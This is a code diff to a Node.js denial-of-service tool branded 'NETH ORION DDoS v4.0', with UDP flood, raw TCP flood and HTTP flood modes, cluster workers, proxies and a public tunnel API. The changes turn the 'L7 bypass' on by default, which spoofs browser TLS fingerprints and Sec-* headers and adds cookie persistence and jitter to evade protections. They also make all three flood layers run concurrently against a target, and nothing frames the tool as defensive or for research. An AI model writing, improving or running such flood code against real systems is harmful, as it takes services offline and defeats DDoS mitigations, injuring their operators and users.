@@ -25,7 +25,7 @@ const MAX_QUEUE = parseInt(process.env.MAX_QUEUE, 10) || 20;
 const USE_UDP = process.env.UDP_FLOOD !== "false";
 const USE_RAW_TCP = process.env.RAW_TCP !== "false";
 const KEEP_ALIVE = process.env.KEEP_ALIVE !== "false";
-const L7_BYPASS = process.env.L7_BYPASS === "true";
+const L7_BYPASS = process.env.L7_BYPASS !== "false";
 
 const colors = {
   red: (t) => `\x1b[31m${t}\x1b[0m`,
@@ -279,18 +279,16 @@ if (USE_CLUSTER && cluster.isWorker) {
       return;
     }
 
+    // Launch ALL attack types simultaneously
     if (USE_UDP) {
       const parsed = new URL(target.url);
       udpFlood(parsed.hostname, parsed.port || 80, threadId);
-      return;
     }
-
     if (USE_RAW_TCP) {
       const parsed = new URL(target.url);
       rawTCPFlood(parsed.hostname, parsed.port || 80, threadId);
-      return;
     }
-
+    // HTTP/L7 requests fire concurrently with UDP/TCP above
     const promises = [];
     for (let i = 0; i < REQUESTS_PER_CYCLE; i++) {
       const cb = generateCacheBuster();
@@ -535,9 +533,11 @@ const startAttack = async (url, durationHours) => {
     console.log(colors.magenta(`Workers: ${Object.keys(cluster.workers).length} | Distributed mode`));
   }
   console.log(colors.magenta(`Direct: ${directCount} threads | Proxy: ${proxyCount} threads`));
-  if (USE_UDP) console.log(colors.red("UDP FLOOD MODE ENABLED"));
-  if (USE_RAW_TCP) console.log(colors.red("RAW TCP MODE ENABLED"));
+  if (USE_UDP) console.log(colors.red("UDP FLOOD: ON"));
+  if (USE_RAW_TCP) console.log(colors.red("RAW TCP: ON"));
   if (KEEP_ALIVE) console.log(colors.cyan("Keep-Alive: ON"));
+  if (L7_BYPASS) console.log(colors.magenta("L7 BYPASS: ON (browser TLS fingerprints + Sec-* headers + cookie persistence + jitter)"));
+  console.log(colors.green("ALL ATTACK LAYERS RUNNING CONCURRENTLY (L4 UDP + L4 TCP + L7 HTTP)"));
   if (tunnelActive && nportUrl) console.log(colors.magenta(`Public: ${nportUrl}`));
   console.log("");
 
@@ -599,17 +599,16 @@ const performAttackSingle = async (target, ctx, threadId, isDirect) => {
     return;
   }
 
+  // Launch ALL attack types simultaneously
   if (USE_UDP) {
     const parsed = new URL(target.url);
     udpFlood(parsed.hostname, parsed.port || 80, threadId);
-    return;
   }
   if (USE_RAW_TCP) {
     const parsed = new URL(target.url);
     rawTCPFlood(parsed.hostname, parsed.port || 80, threadId);
-    return;
   }
-
+  // HTTP/L7 requests fire concurrently with UDP/TCP above
   const startTime = Date.now();
   const promises = [];
   for (let i = 0; i < REQUESTS_PER_CYCLE; i++) {
@@ -765,7 +764,7 @@ const showHelp = () => {
   console.log(`${colors.green("exit")}                       - Exit\n`);
   const mode = USE_CLUSTER && cluster.isMaster ? `Cluster (${Object.keys(cluster.workers).length} workers)` : "Single-process";
   console.log(colors.gray(`Threads: ${numThreads} | Cycle: ${REQUESTS_PER_CYCLE} | Mode: ${mode}`));
-  console.log(colors.gray(`UDP Mode: ${USE_UDP} | Raw TCP: ${USE_RAW_TCP}`));
+  console.log(colors.gray(`UDP: ${USE_UDP} | Raw TCP: ${USE_RAW_TCP} | L7 Bypass: ${L7_BYPASS} | Keep-Alive: ${KEEP_ALIVE}`));
 };
 
 const showQueue = () => {
@@ -784,7 +783,7 @@ const clearConsole = () => {
   console.clear();
   console.log(colors.green("NETH ORION DDoS v4.0"));
   const mode = USE_CLUSTER && cluster.isMaster ? `Cluster (${Object.keys(cluster.workers).length} workers)` : "Single-process";
-  console.log(colors.gray(`Mode: ${mode} | Keep-Alive: ${KEEP_ALIVE} | UDP: ${USE_UDP} | RAW: ${USE_RAW_TCP}`));
+  console.log(colors.gray(`Mode: ${mode} | Keep-Alive: ${KEEP_ALIVE} | UDP: ${USE_UDP} | RAW: ${USE_RAW_TCP} | L7: ${L7_BYPASS}`));
   console.log(colors.gray('Type "help" for commands\n'));
 };
 
@@ -862,7 +861,7 @@ const port = process.env.PORT || 25694;
     console.log(colors.green(`\nNETH ORION DDoS v4.0`));
     console.log(colors.cyan(`Local API: http://localhost:${port}`));
     console.log(colors.magenta(`Mode: ${mode} | Threads: ${numThreads} | Keep-Alive: ${KEEP_ALIVE}`));
-    console.log(colors.red(`UDP Flood: ${USE_UDP} | Raw TCP: ${USE_RAW_TCP}`));
+    console.log(colors.red(`UDP: ${USE_UDP} | Raw TCP: ${USE_RAW_TCP} | L7: ${L7_BYPASS} | Keep-Alive: ${KEEP_ALIVE}`));
     if (tunnelActive && nportUrl) console.log(colors.magenta(`Public API: ${nportUrl}`));
     console.log(colors.green('\nType "help" for commands\n'));
 
